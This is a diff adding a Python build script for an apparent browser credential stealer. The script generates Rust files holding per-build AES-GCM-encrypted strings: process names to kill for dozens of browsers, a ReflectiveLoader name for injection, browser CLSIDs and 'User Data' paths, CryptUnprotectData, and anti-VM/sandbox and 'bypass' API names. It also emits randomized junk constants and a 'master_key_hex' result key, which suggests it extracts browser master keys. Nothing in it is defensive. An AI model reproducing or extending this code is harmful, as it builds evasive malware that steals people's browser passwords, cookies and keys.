@@ -1,0 +1,425 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import random
+from datetime import datetime
+
+from Crypto.Cipher import AES
+
+
+def aes256gcm_encrypt(plaintext: bytes, key: bytes) -> tuple:
+    nonce = os.urandom(12)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+    return ciphertext + tag, nonce
+
+
+def format_const_array(name: str, data: bytes, pub: bool = False) -> str:
+    hex_bytes = ", ".join(f"0x{b:02X}" for b in data)
+    prefix = "pub " if pub else ""
+    return f"{prefix}static {name}: [u8; {len(data)}] = [{hex_bytes}];"
+
+
+def format_const_slice(name: str, data: bytes, pub: bool = False) -> str:
+    hex_bytes = ", ".join(f"0x{b:02X}" for b in data)
+    prefix = "pub " if pub else ""
+    return f"{prefix}static {name}: &[u8] = &[{hex_bytes}];"
+
+
+def generate_kill_strings() -> list:
+    # Only browser/helper exe names remain here; Win32 API names are now
+    # resolved by hash (api_hash.rs) — no strings needed.
+    strings = [
+        ("KILL_CHROME", "chrome.exe"),
+        ("KILL_EDGE", "msedge.exe"),
+        ("KILL_MSEDGE_WEBVIEW2", "msedgewebview2.exe"),
+        ("KILL_BRAVE", "brave.exe"),
+        ("KILL_VIVALDI", "vivaldi.exe"),
+        ("KILL_OPERA", "opera.exe"),
+        ("KILL_FIREFOX", "firefox.exe"),
+        ("KILL_WATERFOX", "waterfox.exe"),
+        ("KILL_LIBREWOLF", "librewolf.exe"),
+        ("KILL_YANDEX", "yandex.exe"),
+        ("KILL_BROWSER", "browser.exe"),
+        # Additional Chromium-based browsers
+        ("KILL_360CHROME", "360chrome.exe"),
+        ("KILL_EPIC", "epic.exe"),
+        ("KILL_URAN", "uran.exe"),
+        ("KILL_7STAR", "7star.exe"),
+        ("KILL_TORCH", "torch.exe"),
+        ("KILL_KOMETA", "kometa.exe"),
+        ("KILL_ORBITUM", "orbitum.exe"),
+        ("KILL_AMIGO", "amigo.exe"),
+        ("KILL_SPUTNIK", "sputnik.exe"),
+        ("KILL_COCCOC", "coccoc.exe"),
+        ("KILL_CENT", "centbrowser.exe"),
+        ("KILL_IRIDIUM", "iridium.exe"),
+        ("KILL_SLIMJET", "slimjet.exe"),
+        # Helpers / updaters / crash handlers
+        ("KILL_CHROMEDRIVER", "chromedriver.exe"),
+        ("KILL_GOOGLEUPDATE", "googleupdate.exe"),
+        ("KILL_CRASHHANDLER", "crashpad_handler.exe"),
+        ("KILL_CRASHPAD", "crashpad.exe"),
+        ("KILL_BROWSER_BLPOP", "browser_broker.exe"),
+        ("KILL_MSEDGE_UPDATE", "microsoftedgeupdate.exe"),
+        ("KILL_BRAVE_UPDATE", "braveupdate.exe"),
+        ("KILL_OPERA_UPDATE", "operaupdate.exe"),
+        ("KILL_PLUGIN_CONTAINER", "plugin-container.exe"),
+        ("KILL_PLUGIN_CONTAINER64", "plugin-container64.exe"),
+        ("KILL_UPDATER", "updater.exe"),
+    ]
+    result = []
+    for name, plaintext in strings:
+        key = os.urandom(32)
+        ct, nonce = aes256gcm_encrypt(plaintext.encode('utf-8'), key)
+        result.append((name, key, nonce, ct))
+    return result
+
+
+def generate_lib_strings() -> list:
+    strings = [
+        ("LIB_K32", "kernel32.dll"),
+        ("RESULT_ENV", "CHROME_RECOVERY_RESULT"),
+        ("USER_DATA_ENV", "CHROME_RECOVERY_USER_DATA_REL"),
+        ("DATA_ROOT_ENV", "CHROME_RECOVERY_DATA_ROOT"),
+        ("DATA_ROOT_VAL", "local"),
+        ("DATA_ROOT_VAL_R", "roaming"),
+        ("BROWSER_NAME_ENV", "CHROME_RECOVERY_BROWSER_NAME"),
+        ("BROWSER_CLSID_ENV", "CHROME_RECOVERY_CLSID"),
+        ("OPEN_PROC", "OpenProcess"),
+        ("TERM_PROC", "TerminateProcess"),
+        ("CLOSE_H", "CloseHandle"),
+        ("CTX_SNAP", "CreateToolhelp32Snapshot"),
+        ("P32_FIRST", "Process32FirstW"),
+        ("P32_NEXT", "Process32NextW"),
+        ("RL", "ReflectiveLoader"),
+        # Browser exe names used in inject/src/browsers.rs and lib.rs
+        ("INJ_CHROME_EXE",  "chrome.exe"),
+        ("INJ_EDGE_EXE",    "msedge.exe"),
+        ("INJ_BRAVE_EXE",   "brave.exe"),
+        ("INJ_VIVALDI_EXE", "vivaldi.exe"),
+        ("INJ_OPERA_EXE",   "opera.exe"),
+        ("INJ_BROWSER_EXE", "browser.exe"),
+        # CLSID strings used in inject/src/browsers.rs
+        ("INJ_CLSID_CHROME",        "{708860E0-F641-4611-8895-7D867DD3675B}"),
+        ("INJ_CLSID_CHROME_BETA",   "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}"),
+        ("INJ_CLSID_CHROME_DEV",    "{DA7FDCA5-2CAA-4637-AA17-0740584DE7DA}"),
+        ("INJ_CLSID_CHROME_CANARY", "{704C2872-2049-435E-A469-0A534313C42B}"),
+        ("INJ_CLSID_EDGE",          "{1FCBE96C-1697-43AF-9140-2897C7C69767}"),
+        ("INJ_CLSID_BRAVE",         "{576B31AF-6369-4B6B-8560-E4B203A97A8B}"),
+        # Common browser path fragments
+        ("INJ_PATH_LOCALAPPDATA", "LOCALAPPDATA"),
+        ("INJ_PATH_APPDATA",      "APPDATA"),
+        ("INJ_PATH_PROGRAMFILES", "ProgramFiles"),
+        ("INJ_PATH_PF86",         "ProgramFiles(x86)"),
+        ("INJ_PATH_CHROME_APP",        r"Google\Chrome\Application\chrome.exe"),
+        ("INJ_PATH_EDGE_APP",          r"Microsoft\Edge\Application\msedge.exe"),
+        ("INJ_PATH_BRAVE_APP",         r"BraveSoftware\Brave-Browser\Application\brave.exe"),
+        ("INJ_PATH_VIVALDI_APP",       r"Vivaldi\Application\vivaldi.exe"),
+        ("INJ_PATH_OPERA_APP",         r"Programs\Opera\opera.exe"),
+        ("INJ_PATH_YANDEX_APP",        r"Yandex\YandexBrowser\Application\browser.exe"),
+        # User Data relative paths used in inject/src/browsers.rs
+        ("INJ_UD_CHROME",              r"Google\Chrome\User Data"),
+        ("INJ_UD_CHROME_BETA",         r"Google\Chrome Beta\User Data"),
+        ("INJ_UD_CHROME_DEV",          r"Google\Chrome Dev\User Data"),
+        ("INJ_UD_CHROME_CANARY",       r"Google\Chrome SxS\User Data"),
+        ("INJ_UD_CHROMIUM",            r"Chromium\User Data"),
+        ("INJ_UD_EDGE",                r"Microsoft\Edge\User Data"),
+        ("INJ_UD_EDGE_BETA",           r"Microsoft\Edge Beta\User Data"),
+        ("INJ_UD_EDGE_DEV",            r"Microsoft\Edge Dev\User Data"),
+        ("INJ_UD_BRAVE",               r"BraveSoftware\Brave-Browser\User Data"),
+        ("INJ_UD_BRAVE_BETA",          r"BraveSoftware\Brave-Browser-Beta\User Data"),
+        ("INJ_UD_BRAVE_NIGHTLY",       r"BraveSoftware\Brave-Browser-Nightly\User Data"),
+        ("INJ_UD_OPERA",               r"Opera Software\Opera Stable"),
+        ("INJ_UD_OPERA_GX",            r"Opera Software\Opera GX Stable"),
+        ("INJ_UD_OPERA_NEON",          r"Opera Software\Opera Neon\User Data"),
+        ("INJ_UD_VIVALDI",             r"Vivaldi\User Data"),
+        ("INJ_UD_YANDEX",              r"Yandex\YandexBrowser\User Data"),
+        ("INJ_UD_COCCOC",              r"CocCoc\Browser\User Data"),
+        ("INJ_UD_CENT",                r"CentBrowser\User Data"),
+        ("INJ_UD_360CHROME",           r"360Chrome\Chrome\User Data"),
+        ("INJ_UD_EPIC",                r"Epic Privacy Browser\User Data"),
+        ("INJ_UD_URAN",                r"uCozMedia\Uran\User Data"),
+        ("INJ_UD_7STAR",               r"7Star\7Star\User Data"),
+        ("INJ_UD_TORCH",               r"Torch\User Data"),
+        ("INJ_UD_KOMETA",              r"Kometa\User Data"),
+        ("INJ_UD_ORBITUM",             r"Orbitum\User Data"),
+        ("INJ_UD_AMIGO",               r"Amigo\User Data"),
+        ("INJ_UD_SPUTNIK",             r"Sputnik\Sputnik\User Data"),
+        ("INJ_UD_SLIMJET",             r"Slimjet\User Data"),
+        ("INJ_UD_IRIDIUM",             r"Iridium\User Data"),
+        ("INJ_UD_THORIUM",             r"Thorium\User Data"),
+        ("INJ_UD_ARC",                 r"The Browser Company\Arc\User Data"),
+        # Extra exe names for inject
+        ("INJ_EXE_360CHROME",          "360chrome.exe"),
+        ("INJ_EXE_EPIC",               "epic.exe"),
+        ("INJ_EXE_URAN",               "uran.exe"),
+        ("INJ_EXE_7STAR",              "7star.exe"),
+        ("INJ_EXE_TORCH",              "torch.exe"),
+        ("INJ_EXE_KOMETA",             "kometa.exe"),
+        ("INJ_EXE_ORBITUM",            "orbitum.exe"),
+        ("INJ_EXE_AMIGO",              "amigo.exe"),
+        ("INJ_EXE_SPUTNIK",            "sputnik.exe"),
+        ("INJ_EXE_SLIMJET",            "slimjet.exe"),
+        ("INJ_EXE_IRIDIUM",            "iridium.exe"),
+        ("INJ_EXE_THORIUM",            "thorium.exe"),
+        ("INJ_EXE_ARC",                "Arc.exe"),
+        # Browser display names for inject
+        ("INJ_NAME_CHROME",            "Chrome"),
+        ("INJ_NAME_CHROME_BETA",       "Chrome Beta"),
+        ("INJ_NAME_CHROME_DEV",        "Chrome Dev"),
+        ("INJ_NAME_CHROME_CANARY",     "Chrome Canary"),
+        ("INJ_NAME_CHROMIUM",          "Chromium"),
+        ("INJ_NAME_EDGE",              "Edge"),
+        ("INJ_NAME_EDGE_BETA",         "Edge Beta"),
+        ("INJ_NAME_EDGE_DEV",          "Edge Dev"),
+        ("INJ_NAME_BRAVE",             "Brave"),
+        ("INJ_NAME_BRAVE_BETA",        "Brave Beta"),
+        ("INJ_NAME_BRAVE_NIGHTLY",     "Brave Nightly"),
+        ("INJ_NAME_OPERA",             "Opera"),
+        ("INJ_NAME_OPERA_GX",          "OperaGX"),
+        ("INJ_NAME_OPERA_NEON",        "Opera Neon"),
+        ("INJ_NAME_VIVALDI",           "Vivaldi"),
+        ("INJ_NAME_YANDEX",            "Yandex"),
+        ("INJ_NAME_COCCOC",            "CocCoc"),
+        ("INJ_NAME_CENT",              "CentBrowser"),
+        ("INJ_NAME_360CHROME",         "360Chrome"),
+        ("INJ_NAME_EPIC",              "Epic Privacy Browser"),
+        ("INJ_NAME_URAN",              "Uran"),
+        ("INJ_NAME_7STAR",             "7Star"),
+        ("INJ_NAME_TORCH",             "Torch"),
+        ("INJ_NAME_KOMETA",            "Kometa"),
+        ("INJ_NAME_ORBITUM",           "Orbitum"),
+        ("INJ_NAME_AMIGO",             "Amigo"),
+        ("INJ_NAME_SPUTNIK",           "Sputnik"),
+        ("INJ_NAME_SLIMJET",           "Slimjet"),
+        ("INJ_NAME_IRIDIUM",           "Iridium"),
+        ("INJ_NAME_THORIUM",           "Thorium"),
+        ("INJ_NAME_ARC",               "Arc"),
+        # Chrome headless flags (each flag separately to avoid one giant string)
+        ("CHROME_FLAG_HEADLESS",       "--headless=new"),
+        ("CHROME_FLAG_NOGPU",          "--disable-gpu"),
+        ("CHROME_FLAG_NOLOG",          "--disable-logging"),
+        ("CHROME_FLAG_LOGLVL",         "--log-level=3"),
+        ("CHROME_FLAG_NOBGNET",        "--disable-background-networking"),
+        ("CHROME_FLAG_NOSYNC",         "--disable-sync"),
+        ("CHROME_FLAG_NODEFA",         "--disable-default-apps"),
+        ("CHROME_FLAG_NOEXT",          "--disable-extensions"),
+        ("CHROME_FLAG_NOUPDATE",       "--disable-component-update"),
+        ("CHROME_FLAG_NOFIRST",        "--no-first-run"),
+        ("CHROME_FLAG_NODEFBR",        "--no-default-browser-check"),
+        ("CHROME_FLAG_NOERR",          "--noerrdialogs"),
+        ("CHROME_FLAG_NODEVTOOLS",     "--disable-dev-tools"),
+        ("CHROME_FLAG_NOTRANSLATE",    "--disable-features=Translate"),
+        ("CHROME_FLAG_NOFLOOD",        "--disable-ipc-flooding-protection"),
+        ("CHROME_FLAG_NOBREAKPAD",     "--disable-breakpad"),
+        ("CHROME_FLAG_METRICS",        "--metrics-recording-only"),
+        ("CHROME_FLAG_USERDATA",       "--user-data-dir="),
+        # JSON key used in result file communication (read-side in inject)
+        ("JSON_KEY_MASTER",            "master_key_hex"),
+        ("JSON_KEY_ERROR",             "error"),
+        ("JSON_KEY_BROWSER",           "browser"),
+    ]
+    result = []
+    for name, plaintext in strings:
+        key = os.urandom(32)
+        ct, nonce = aes256gcm_encrypt(plaintext.encode('utf-8'), key)
+        result.append((name, key, nonce, ct))
+    return result
+
+
+def generate_elev_strings() -> list:
+    # All Win32 API and DLL names are now resolved by hash (api_hash.rs).
+    # This function is kept for structural compatibility but returns nothing.
+    return []
+
+
+def generate_api_aes_constants() -> list:
+    """Return list of (const_name, key, nonce, ciphertext) for api.rs — AES-256-GCM."""
+    strings = [
+        ("CRYPTUNPROTECTDATA_ENC", b"CryptUnprotectData"),
+        ("LOCALFREE_ENC",          b"LocalFree"),
+        ("GETTICKCOUNT64_ENC",     b"GetTickCount64"),
+        ("GETSYSTEMINFO_ENC",      b"GetSystemInfo"),
+        ("GLOBALMEMORYSTATUSEX_ENC", b"GlobalMemoryStatusEx"),
+        ("LOADLIBRARYW_ENC",       b"LoadLibraryW"),
+        ("MESSAGEBOXW_ENC",        b"MessageBoxW"),
+        ("GETSYSTEMMETRICS_ENC",   b"GetSystemMetrics"),
+        ("CRYPT32_DLL_ENC",        b"crypt32.dll"),
+        ("KERNEL32_DLL_ENC",       b"kernel32.dll"),
+        ("USER32_DLL_ENC",         b"user32.dll"),
+        # === sandbox / anti-VM APIs ===
+        ("ADVAPI32_DLL_ENC",       b"advapi32.dll"),
+        ("REGOPENKEYEXW_ENC",      b"RegOpenKeyExW"),
+        ("REGCLOSEKEY_ENC",        b"RegCloseKey"),
+        ("GETCURSORPOS_ENC",       b"GetCursorPos"),
+        ("GETFOREGROUNDWINDOW_ENC", b"GetForegroundWindow"),
+        ("ENUMDISPLAYDEVICESW_ENC", b"EnumDisplayDevicesW"),
+        ("CREATETOOLHELP32SNAPSHOT_ENC", b"CreateToolhelp32Snapshot"),
+        ("PROCESS32FIRSTW_ENC",    b"Process32FirstW"),
+        ("PROCESS32NEXTW_ENC",     b"Process32NextW"),
+        ("CLOSEHANDLE_ENC",        b"CloseHandle"),
+        ("OPENPROCESS_ENC",        b"OpenProcess"),
+        ("QUERYFULLPROCESSIMAGENAMEW_ENC", b"QueryFullProcessImageNameW"),
+        ("NTDLL_DLL_ENC",          b"ntdll.dll"),
+        ("NTQUERYSYSTEMINFORMATION_ENC", b"NtQuerySystemInformation"),
+        ("GETDISKFREESPACEEXW_ENC", b"GetDiskFreeSpaceExW"),
+        ("GETVOLUMEINFORMATIONW_ENC", b"GetVolumeInformationW"),
+        ("GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC", b"GetPhysicallyInstalledSystemMemory"),
+        # === bypass.rs APIs ===
+        ("VIRTUALPROTECT_ENC",          b"VirtualProtect"),
+        ("FLUSHINSTRUCTION_ENC",        b"FlushInstructionCache"),
+        ("GETCURRENTPROCESS_ENC",       b"GetCurrentProcess"),
+    ]
+    result = []
+    for name, plaintext in strings:
+        key = os.urandom(32)
+        ct, nonce = aes256gcm_encrypt(plaintext, key)
+        result.append((name, key, nonce, ct))
+    return result
+
+
+# Use int type alias for clarity
+u8 = int
+
+
+def generate_polymorphic_keys(output_dir: str):
+    os.makedirs(output_dir, exist_ok=True)
+
+    inject_dir = os.path.join(output_dir, "inject", "src")
+    os.makedirs(inject_dir, exist_ok=True)
+
+    kill_strings = generate_kill_strings()
+    lib_strings = generate_lib_strings()
+    elev_strings = generate_elev_strings()
+
+    # Per-build AES-256-GCM constants for api.rs (replaces rolling-XOR)
+    api_constants = generate_api_aes_constants()
+
+    # Per-build random junk constants (replace obvious magic numbers)
+    junk_a = random.randint(0x10000000, 0xEFFFFFFF)
+    junk_b = random.randint(0x10000000, 0xEFFFFFFF)
+    junk_magic = random.randint(0x1000, 0xEFFF)
+    junk_xor_const = random.randint(0xC0, 0xFE)
+    junk_mul_big = random.randint(0x40000000, 0x7FFFFF00) | 1
+    junk_large_xor = random.randint(0x1000000000, 0xEFFFFFFFFFFF)
+
+    lines = []
+    lines.append("// AUTO-GENERATED by build.py - DO NOT EDIT")
+    lines.append(f"// Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    lines.append(f"// AES-256-GCM encrypted strings - unique per build")
+    lines.append("")
+    lines.append("#![allow(dead_code, non_upper_case_globals)]")
+    lines.append("")
+    lines.append("use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};")
+    lines.append("")
+
+    lines.append("// ===== kill.rs strings =====")
+    for name, key, nonce, ct in kill_strings:
+        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
+        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
+        lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
+    lines.append("")
+
+    lines.append("// ===== lib.rs strings (for inject crate) =====")
+    for name, key, nonce, ct in lib_strings:
+        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
+        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
+        lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
+    lines.append("")
+
+    lines.append("// ===== elev.rs strings =====")
+    for name, key, nonce, ct in elev_strings:
+        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
+        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
+        lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
+    lines.append("")
+
+    # Emit AES-256-GCM constants for api.rs (replaces rolling-XOR)
+    lines.append("// ===== api.rs AES-256-GCM string constants =====")
+    for name, key, nonce, ct in api_constants:
+        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
+        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
+        lines.append(format_const_slice(f"{name}_CT", ct, pub=True))
+    lines.append("")
+
+    # Emit junk constants (randomized per build)
+    lines.append("// ===== junk.rs per-build magic constants =====")
+    lines.append(f"pub const JUNK_A: u32 = 0x{junk_a:08X};")
+    lines.append(f"pub const JUNK_B: u32 = 0x{junk_b:08X};")
+    lines.append(f"pub const JUNK_MAGIC: u32 = 0x{junk_magic:04X};")
+    lines.append(f"pub const JUNK_XOR_CONST: u8 = 0x{junk_xor_const:02X};")
+    lines.append(f"pub const JUNK_MUL_BIG: u64 = 0x{junk_mul_big:016X};")
+    lines.append(f"pub const JUNK_LARGE_XOR: u64 = 0x{junk_large_xor:016X};")
+    lines.append("")
+
+    lines.append("// ===== AES decrypt functions =====")
+    lines.append("pub fn aes_decrypt(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {")
+    lines.append("    let cipher = unsafe { Aes256Gcm::new_from_slice(key).unwrap_unchecked() };")
+    lines.append("    let n = Nonce::from_slice(nonce);")
+    lines.append("    cipher.decrypt(n, encoded).unwrap_or_default()")
+    lines.append("}")
+    lines.append("")
+    lines.append("pub fn aes_to_cstring(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> std::ffi::CString {")
+    lines.append("    let decoded = aes_decrypt(encoded, key, nonce);")
+    lines.append("    unsafe { std::ffi::CString::from_vec_unchecked(decoded) }")
+    lines.append("}")
+    lines.append("")
+    lines.append("pub fn aes_decode_stack(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12], buf: &mut [u8; 256]) -> usize {")
+    lines.append("    let decoded = aes_decrypt(encoded, key, nonce);")
+    lines.append("    let len = decoded.len().min(255);")
+    lines.append("    buf[..len].copy_from_slice(&decoded[..len]);")
+    lines.append("    buf[len] = 0;")
+    lines.append("    len")
+    lines.append("}")
+
+    output_path = os.path.join(output_dir, "polymorphic_keys.rs")
+    with open(output_path, 'w', encoding='utf-8') as f:
+        f.write('\n'.join(lines))
+        f.write('\n')
+
+    inject_lines = []
+    inject_lines.append("// AUTO-GENERATED by build.py - DO NOT EDIT")
+    inject_lines.append(f"// Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    inject_lines.append(f"// AES-256-GCM encrypted strings - unique per build")
+    inject_lines.append("")
+    inject_lines.append("#![allow(dead_code, non_upper_case_globals)]")
+    inject_lines.append("")
+    inject_lines.append("use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};")
+    inject_lines.append("")
+
+    inject_lines.append("// ===== lib.rs strings =====")
+    for name, key, nonce, ct in lib_strings:
+        inject_lines.append(format_const_array(f"{name}_KEY", key, pub=True))
+        inject_lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
+        inject_lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
+    inject_lines.append("")
+
+    inject_lines.append("// ===== AES decrypt functions =====")
+    inject_lines.append("pub fn aes_decrypt(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {")
+    inject_lines.append("    let cipher = unsafe { Aes256Gcm::new_from_slice(key).unwrap_unchecked() };")
+    inject_lines.append("    let n = Nonce::from_slice(nonce);")
+    inject_lines.append("    cipher.decrypt(n, encoded).unwrap_or_default()")
+    inject_lines.append("}")
+    inject_lines.append("")
+    inject_lines.append("pub fn aes_to_cstring(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> std::ffi::CString {")
+    inject_lines.append("    let decoded = aes_decrypt(encoded, key, nonce);")
+    inject_lines.append("    unsafe { std::ffi::CString::from_vec_unchecked(decoded) }")
+    inject_lines.append("}")
+
+    inject_output_path = os.path.join(inject_dir, "polymorphic_keys.rs")
+    with open(inject_output_path, 'w', encoding='utf-8') as f:
+        f.write('\n'.join(inject_lines))
+        f.write('\n')
+
+    print(f"[OK] Generated {output_path}")
+    print(f"[OK] Generated {inject_output_path}")
+
+    return 0, 0, 0
+
+
+if __name__ == "__main__":
+    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    src_dir = os.path.join(project_root, "src")
+    generate_polymorphic_keys(src_dir)
